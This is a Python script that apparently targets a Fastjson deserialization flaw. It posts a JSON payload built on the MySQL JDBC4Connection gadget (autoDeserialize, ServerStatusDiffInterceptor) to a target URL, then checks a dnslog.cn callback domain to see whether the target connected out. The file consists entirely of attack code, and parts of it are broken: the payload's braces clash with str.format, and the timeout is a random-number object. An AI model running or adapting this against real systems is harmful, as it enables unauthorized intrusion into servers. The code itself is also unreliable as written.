import random
import re
import logging
from pprint import pprint

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
class fastjson():
    def __init__(self):
        self.headers = {}
        self.data = '{"x": {"@type": "java.lang.AutoCloseable", "@type": "com.mysql.jdbc.JDBC4Connection","hostToConnectTo": "{}", "portToConnectTo": 80,"info": {"user": "root", "password": "ubuntu", "useSSL": "false","statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize": "true"}, "databaseToConnectTo": "mysql", "url": ""}}'
        self.timeout = random.Random()
        self.session = requests.session()
        
    def run(self, url, dnslog):
        try:
            requests.post(url=url, headers=self.headers, data=self.data.format(dnslog), timeout=self.timeout, verify=False)
        except:
            logging.error("%s 无法访问" % url)

    def dnslog(self):  # 获取dnslog的地址
        url = self.session.get(url="http://dnslog.cn/getdomain.php", timeout=10, verify=False)
        return url.text

    def dnshistroy(self):  # 获取dnslog访问地址列表
        url = self.session.get(url="http://dnslog.cn/getrecords.php", timeout=10, verify=False)
        return url.text[1:-1]

    def context(self):
        context = self.dnshistroy()
        if context.__len__() > 0:
            pprint(re.findall(r'\[.*?\]', context))
        else:
            logging.info("DNSLOG没有值")


if __name__ == '__main__':
    func = fastjson()
    dnslog = func.dnslog()    
    func.run("http://目标地址/", dnslog)
    